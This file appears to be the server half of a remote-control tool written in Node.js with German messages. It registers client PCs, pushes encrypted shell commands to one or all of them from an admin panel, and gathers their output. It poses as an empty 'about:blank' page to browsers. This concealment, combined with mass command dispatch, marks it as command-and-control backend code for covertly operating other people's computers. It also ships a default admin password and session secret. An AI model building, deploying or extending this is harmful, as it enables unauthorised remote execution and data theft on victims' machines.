const express = require('express');
const session = require('express-session');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const http = require('http');
const WebSocket = require('ws');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ 
    server,
    perMessageDeflate: false,
    maxPayload: 1024 * 1024
});
const PORT = process.env.PORT || 3000;

app.set('trust proxy', 1);
app.use((req, res, next) => {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    next();
});

const ADMIN_PASSWORT = process.env.ADMIN_PASSWORD || "Achtung_Passwort_ndern";
const AES_KEY = crypto.randomBytes(32);
const ALGORITHM = 'aes-256-cbc';
const registeredTokens = {};
const pcCommands = {};
const pcOutputs = {};
const clientConnections = new Map();
const adminConnections = new Set();

function generateToken() { return crypto.randomBytes(24).toString('hex'); }

function encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(ALGORITHM, AES_KEY, iv);
    return iv.toString('hex') + ':' + (cipher.update(text, 'utf8', 'hex') + cipher.final('hex'));
}

function decrypt(text) {
    const parts = text.split(':');
    const iv = Buffer.from(parts[0], 'hex');
    const decipher = crypto.createDecipheriv(ALGORITHM, AES_KEY, iv);
    return decipher.update(parts[1], 'hex', 'utf8') + decipher.final('utf8');
}

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
    secret: process.env.SESSION_SECRET || 'session-secret',
    resave: false, saveUninitialized: false,
    cookie: { maxAge: 30 * 60 * 1000 }
}));

const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5,
    message: '<h1>Zu viele Fehlversuche!</h1>' });

// ==================== WEBSOCKET SERVER ====================
wss.on('connection', (ws, req) => {
    const url = new URL(req.url, 'http://' + req.headers.host);
    const type = url.searchParams.get('type');
    
    ws.isAlive = true;
    ws.on('pong', function() {
        ws.isAlive = true;
    });
    
    if (type === 'client') {
        handleClientWebSocket(ws, url);
    } else if (type === 'admin') {
        handleAdminWebSocket(ws);
    } else {
        ws.close(1008, 'Invalid type parameter');
    }
});

function handleClientWebSocket(ws, url) {
    let pcId = null;
    let token = null;
    
    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data.toString());
            
            switch (msg.type) {
                case 'register':
                    if (!registeredTokens[msg.pcId]) {
                        registeredTokens[msg.pcId] = { 
                            token: generateToken(), 
                            lastSeen: Date.now(), 
                            online: false 
                        };
                    }
                    pcId = msg.pcId;
                    token = registeredTokens[pcId].token;
                    registeredTokens[pcId].online = true;
                    registeredTokens[pcId].lastSeen = Date.now();
                    clientConnections.set(pcId, ws);
                    
                    ws.send(JSON.stringify({ 
                        type: 'registered', 
                        token: token,
                        pcId: pcId 
                    }));
                    console.log('[WS CLIENT] ' + pcId + ' verbunden');
                    
                    broadcastToAdmins({
                        type: 'pc-status',
                        pcId: pcId,
                        online: true
                    });
                    break;
                    
                case 'heartbeat':
                    if (pcId && registeredTokens[pcId]) {
                        registeredTokens[pcId].lastSeen = Date.now();
                        registeredTokens[pcId].online = true;
                    }
                    break;
                    
                case 'output':
                    if (pcId && token && registeredTokens[pcId] && registeredTokens[pcId].token === token) {
                        try {
                            const output = Buffer.from(msg.data, 'base64').toString('utf8');
                            if (!pcOutputs[pcId]) pcOutputs[pcId] = [];
                            pcOutputs[pcId].push({ 
                                timestamp: new Date().toISOString(), 
                                output: output 
                            });
                            if (pcOutputs[pcId].length > 50) {
                                pcOutputs[pcId] = pcOutputs[pcId].slice(-50);
                            }
                            
                            broadcastToAdmins({
                                type: 'client-output',
                                pcId: pcId,
                                output: output.trim(),
                                timestamp: new Date().toISOString()
                            });
                        } catch (e) {
                            console.error('[WS OUTPUT FEHLER]', e);
                        }
                    }
                    break;
            }
        } catch (e) {
            console.error('[WS MESSAGE FEHLER]', e);
        }
    });
    
    ws.on('close', function() {
        if (pcId) {
            registeredTokens[pcId].online = false;
            clientConnections.delete(pcId);
            console.log('[WS CLIENT] ' + pcId + ' getrennt');
            
            broadcastToAdmins({
                type: 'pc-status',
                pcId: pcId,
                online: false
            });
        }
    });
    
    ws.on('error', function(err) {
        console.error('[WS FEHLER] ' + (pcId || 'unknown') + ':', err.message);
    });
}

function handleAdminWebSocket(ws) {
    adminConnections.add(ws);
    console.log('[WS ADMIN] Verbunden');
    
    ws.on('close', function() {
        adminConnections.delete(ws);
        console.log('[WS ADMIN] Getrennt');
    });
    
    ws.on('error', function(err) {
        console.error('[WS ADMIN FEHLER]', err.message);
    });
}

function broadcastToAdmins(message) {
    const data = JSON.stringify(message);
    adminConnections.forEach(function(adminWs) {
        if (adminWs.readyState === WebSocket.OPEN) {
            adminWs.send(data);
        }
    });
}

function sendCommandToPC(pcId, command) {
    const ws = clientConnections.get(pcId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        const encrypted = encrypt(command);
        ws.send(JSON.stringify({
            type: 'command',
            data: encrypted
        }));
        return true;
    }
    return false;
}

// ==================== REGISTRIERUNG ====================
app.post('/register', (req, res) => {
    const pcId = req.body.pcId;
    if (!pcId) return res.status(400).json({ error: 'pcId erforderlich' });
    if (!registeredTokens[pcId]) {
        registeredTokens[pcId] = { token: generateToken(), lastSeen: Date.now(), online: false };
    }
    registeredTokens[pcId].online = true;
    registeredTokens[pcId].lastSeen = Date.now();
    res.json({ token: registeredTokens[pcId].token });
});

// ==================== PC ENTFERNEN ====================
app.post('/remove-pc', (req, res) => {
    if (!req.session.eingeloggt) return res.status(403).json({ error: 'Unauthorized' });
    const pcId = req.body.pcId;
    if (pcId && registeredTokens[pcId]) {
        const ws = clientConnections.get(pcId);
        if (ws) ws.close(1000, 'PC entfernt');
        
        delete registeredTokens[pcId];
        delete pcCommands[pcId];
        delete pcOutputs[pcId];
        clientConnections.delete(pcId);
        console.log('[PC ENTFERNT] ' + pcId);
        res.json({ status: 'PC ' + pcId + ' entfernt' });
    } else {
        res.status(404).json({ error: 'PC nicht gefunden' });
    }
});

// ==================== HEADLESS (Legacy) ====================
app.get('/headless', (req, res) => {
    const ua = req.headers['user-agent'] || '';
    if (/Mozilla|Chrome|Safari|Firefox|Edge|Brave/i.test(ua)) {
        return res.send('<!DOCTYPE html><html><head><title>about:blank</title></head><body></body></html>');
    }
    const token = req.headers['x-pc-token'];
    const pcId = req.headers['x-pc-id'];
    if (!token || !pcId) return res.status(401).send('Unauthorized');
    if (!registeredTokens[pcId]) {
        registeredTokens[pcId] = { token: token, lastSeen: Date.now(), online: true };
    }
    registeredTokens[pcId].token = token;
    registeredTokens[pcId].online = true;
    registeredTokens[pcId].lastSeen = Date.now();
    const command = pcCommands[pcId];
    if (command) {
        try { res.send(decrypt(command)); delete pcCommands[pcId]; }
        catch (e) { res.send('KEIN_BEFEHL'); }
    } else { res.send('KEIN_BEFEHL'); }
});

// ==================== OUTPUT ====================
app.post('/output', (req, res) => {
    const token = req.headers['x-pc-token'];
    const pcId = req.headers['x-pc-id'];
    if (!token || !pcId || !registeredTokens[pcId] || registeredTokens[pcId].token !== token) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    try {
        const output = Buffer.from(req.body.output, 'base64').toString('utf8');
        if (!pcOutputs[pcId]) pcOutputs[pcId] = [];
        pcOutputs[pcId].push({ timestamp: new Date().toISOString(), output: output });
        if (pcOutputs[pcId].length > 50) pcOutputs[pcId] = pcOutputs[pcId].slice(-50);
        res.json({ status: 'received' });
    } catch (e) { res.status(500).json({ error: 'Base64 Fehler' }); }
});

// ==================== BEFEHL (Ohne Queue) ====================
app.post('/command', (req, res) => {
    if (!req.session.eingeloggt) return res.status(403).json({ error: 'Zugriff verweigert!' });
    const target = req.body.target;
    const command = req.body.command;
    
    if (!command) {
        return res.status(400).json({ error: 'Befehl erforderlich' });
    }
    
    // ========== ALLE PCs ==========
    if (target === 'all') {
        const onlinePCs = Object.keys(registeredTokens).filter(function(id) {
            return clientConnections.has(id);
        });
        
        if (onlinePCs.length === 0) {
            return res.json({ error: 'Keine PCs online' });
        }
        
        let sentCount = 0;
        onlinePCs.forEach(function(id) {
            if (sendCommandToPC(id, command)) {
                sentCount++;
            }
        });
        
        return res.json({ status: 'Gesendet an ' + sentCount + '/' + onlinePCs.length + ' PCs' });
    }
    
    // ========== EINZELNER PC ==========
    if (!registeredTokens[target]) {
        return res.json({ error: 'PC "' + target + '" nicht gefunden' });
    }
    
    if (!clientConnections.has(target)) {
        return res.json({ error: 'PC "' + target + '" ist offline' });
    }
    
    if (sendCommandToPC(target, command)) {
        res.json({ status: 'Befehl an "' + target + '" gesendet' });
    } else {
        res.json({ error: 'PC "' + target + '" ist offline' });
    }
});

// ==================== STATUS ====================
app.get('/pcs', (req, res) => {
    if (!req.session.eingeloggt) return res.status(403).send('Zugriff verweigert!');
    const pcs = Object.entries(registeredTokens).map(function(entry) {
        const id = entry[0];
        const d = entry[1];
        return {
            id: id, 
            online: clientConnections.has(id),
            lastSeen: new Date(d.lastSeen).toLocaleString('de-DE'),
            outputCount: pcOutputs[id] ? pcOutputs[id].length : 0
        };
    });
    res.json(pcs);
});

app.get('/outputs/:pcId', (req, res) => {
    if (!req.session.eingeloggt) return res.status(403).send('Zugriff verweigert!');
    res.json(pcOutputs[req.params.pcId] || []);
});

// ==================== ADMIN ====================
app.get('/', (req, res) => {
    res.send('<!DOCTYPE html><html><head><title>about:blank</title></head><body></body></html>');
});

app.get('/admin', (req, res) => {
    if (req.session.eingeloggt) return res.redirect('/admin/dashboard');
    res.send(
        '<h1>Admin Login</h1>' +
        '<form action="/admin/login" method="POST">' +
        '<input type="password" name="password" placeholder="Passwort" required><br><br>' +
        '<button type="submit">Einloggen</button>' +
        '</form>'
    );
});

app.post('/admin/login', loginLimiter, (req, res) => {
    if (req.body.password === ADMIN_PASSWORT) {
        req.session.eingeloggt = true;
        res.redirect('/admin/dashboard');
    } else {
        res.send('<h1>Falsches Passwort!</h1><a href="/admin">Nochmal</a>');
    }
});

app.get('/admin/dashboard', (req, res) => {
    if (!req.session.eingeloggt) return res.redirect('/admin');
    const dashboardHtml = fs.readFileSync(path.join(__dirname, 'dashboard.html'), 'utf8');
    res.send(dashboardHtml);
});

app.get('/admin/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/admin');
});

// ==================== HEARTBEAT ====================
const heartbeatInterval = setInterval(function() {
    wss.clients.forEach(function(ws) {
        if (ws.isAlive === false) {
            return ws.terminate();
        }
        ws.isAlive = false;
        ws.ping();
    });
}, 20000);

wss.on('close', function() {
    clearInterval(heartbeatInterval);
});

server.listen(PORT, () => {
    console.log('Server lauft auf Port ' + PORT);
    console.log('Admin: /admin');
    console.log('WebSocket: aktiv');
});
